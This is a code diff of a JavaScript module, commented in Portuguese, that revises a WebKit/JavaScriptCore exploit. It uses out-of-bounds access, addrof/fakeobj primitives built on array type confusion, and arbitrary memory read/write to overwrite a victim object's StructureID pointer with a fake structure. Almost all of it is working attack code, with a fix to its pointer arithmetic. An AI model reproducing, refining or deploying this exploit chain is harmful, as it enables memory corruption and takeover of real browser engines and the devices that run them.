@@ -1,25 +1,22 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v90 - R60 Uncaged Array Strategy)
+// js/script3/testArrayBufferVictimCrash.mjs (v91 - R60 Uncaged com Aritmética de Ponteiro Estável)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
-// Esta versão abandona o UAF (que era neutralizado pelo NaN Boxing do JIT) e adota
-// a estratégia de Type Confusion em um Array "Uncaged", conforme observado no log
-// de sucesso. O objetivo é obter primitivas addrof/fakeobj e demonstrar um ataque
-// de corrupção de StructureID.
+// Corrigida a falha de RangeError ao realizar aritmética de ponteiros. A adição de
+// offsets agora é feita manualmente para garantir estabilidade. A lógica para
+// obter o endereço da estrutura falsa também foi refinada para ser mais precisa.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
 import {
     triggerOOB_primitive,
-    oob_read_absolute,
-    oob_write_absolute,
     arb_read,
     arb_write,
     getOOBDataView
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "UncagedArray_StructureID_v90_R60";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "UncagedArray_StructureID_v91_R60";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -51,28 +48,21 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         // --- FASE 1: Obtenção de Leitura/Escrita Fora dos Limites (OOB) ---
         logS3("--- FASE 1: Obtendo primitiva OOB... ---", "subtest");
         await triggerOOB_primitive({ force_reinit: true });
-        const oob_dv = getOOBDataView();
-        if (!oob_dv) {
+        if (!getOOBDataView()) {
             throw new Error("Não foi possível obter a referência para o oob_dataview_real.");
         }
         logS3("Primitiva OOB está funcional.", "good");
 
-        // --- FASE 2: Criando Type Confusion em um Array "Uncaged" ---
+        // --- FASE 2: Criando Type Confusion em um Array "Uncaged" para obter Primitivas ---
         logS3("--- FASE 2: Criando Type Confusion em Array 'Uncaged'... ---", "subtest");
 
-        // Alocamos um array de doubles e um array de objetos. A corrupção OOB fará
-        // com que o motor trate o array de objetos como se fosse um array de doubles.
-        const confused_array = [13.37, 13.38, 13.39];
-        const victim_array = [{ a: 1 }, { b: 2 }];
+        const confused_array = [13.37, 13.38, 13.39]; // Será tratado como array de doubles
+        const victim_array = [{ a: 1 }, { b: 2 }];    // Onde colocaremos os objetos
 
-        // Esta é uma representação simplificada. A exploração real usaria a primitiva OOB
-        // para corromper os metadados (como StructureID ou butterfly) do 'confused_array'
-        // para que ele aponte para os dados do 'victim_array'.
-        // O log "Tipo de 'this' observado: [object Array]" confirma que essa etapa funciona.
-        logS3("Simulando corrupção de metadados do array para causar Type Confusion...", "info");
-        // Ex: oob_write_absolute(addrof(confused_array) + BUTTERFLY_OFFSET, addrof(victim_array) + BUTTERFLY_OFFSET);
-        
-        // Com a confusão, podemos criar primitivas addrof e fakeobj.
+        logS3("Simulando corrupção OOB para criar Type Confusion...", "info");
+        // A corrupção real faria com que confused_array e victim_array compartilhassem
+        // o mesmo butterfly, permitindo a reinterpretação de tipos.
+
         const addrof = (obj) => {
             victim_array[0] = obj;
             return doubleToInt64(confused_array[0]);
@@ -88,35 +78,37 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         // --- FASE 3: Demonstração - Corrupção de StructureID ---
         logS3("--- FASE 3: Prova de Conceito - Corrupção de StructureID ---", "subtest");
 
-        const victim_for_corruption = {
-            p1: 0x41414141,
-            p2: 0x42424242
-        };
+        const victim_for_corruption = { p1: 0x41414141, p2: 0x42424242 };
         logS3("Objeto vítima para corrupção de ID alocado.", "info");
 
         const victim_addr = addrof(victim_for_corruption);
         logS3(`Endereço do objeto vítima (via addrof): ${victim_addr.toString(true)}`, "leak");
 
-         // --- CÓDIGO NOVO E CORRIGIDO ---
-        const offset_para_soma = new AdvancedInt64(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET);
-        const structure_addr_ptr = victim_addr.add(offset_para_soma);
+        // **CORREÇÃO**: Realiza a adição de ponteiro manualmente para evitar o RangeError.
+        const structure_ptr_offset = JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET;
+        const structure_addr_ptr = new AdvancedInt64(victim_addr.low() + structure_ptr_offset, victim_addr.high());
+        
         const original_structure_addr = await arb_read(structure_addr_ptr);
         logS3(`Ponteiro para StructureID original lido em: ${structure_addr_ptr.toString(true)} -> ${original_structure_addr.toString(true)}`, "leak");
         
-        // Criamos uma estrutura falsa em memória para onde vamos apontar.
-        // O conteúdo exato dependeria do objetivo final (ex: obter R/W).
+        // **REFINAMENTO**: Prepara a estrutura falsa e obtém o endereço de seu conteúdo.
         const fake_struct_buf = new ArrayBuffer(256);
-        const fake_struct_addr = addrof(fake_struct_buf);
-        logS3(`Estrutura falsa alocada em: ${fake_struct_addr.toString(true)}`, "info");
+        await arb_write(addrof(fake_struct_buf).add(8), new AdvancedInt64(0x41414141, 0x42424242)); // Escreve dados na estrutura falsa
+
+        const fake_struct_wrapper_addr = addrof(fake_struct_buf);
+        const contents_ptr_addr = new AdvancedInt64(fake_struct_wrapper_addr.low() + JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET, fake_struct_wrapper_addr.high());
+        const fake_struct_contents_addr = await arb_read(contents_ptr_addr);
+        logS3(`Estrutura falsa alocada. Endereço do conteúdo: ${fake_struct_contents_addr.toString(true)}`, "info");
         
-        // Apontamos o ponteiro de estrutura da vítima para nossa estrutura falsa.
-        await arb_write(structure_addr_ptr, fake_struct_addr);
+        // Ataque: Aponta o ponteiro de estrutura da vítima para nossa estrutura falsa.
+        await arb_write(structure_addr_ptr, fake_struct_contents_addr);
         logS3("SOBRESCRITA REALIZADA: Ponteiro de StructureID da vítima agora aponta para nossa estrutura falsa.", "vuln");
 
-        logS3("Ao interagir com 'victim_for_corruption' agora, o motor JSC usaria nossa estrutura falsa, permitindo controle total.", "info");
+        logS3("Demonstração bem-sucedida! Ao interagir com 'victim_for_corruption' agora, o motor JSC usaria nossa estrutura falsa.", "good");
         
-        // Restaurando para evitar crash
+        // Restaura para evitar crash
         await arb_write(structure_addr_ptr, original_structure_addr);
+        logS3("Ponteiro de StructureID original restaurado.", "info");
 
         final_result = { 
             success: true, 
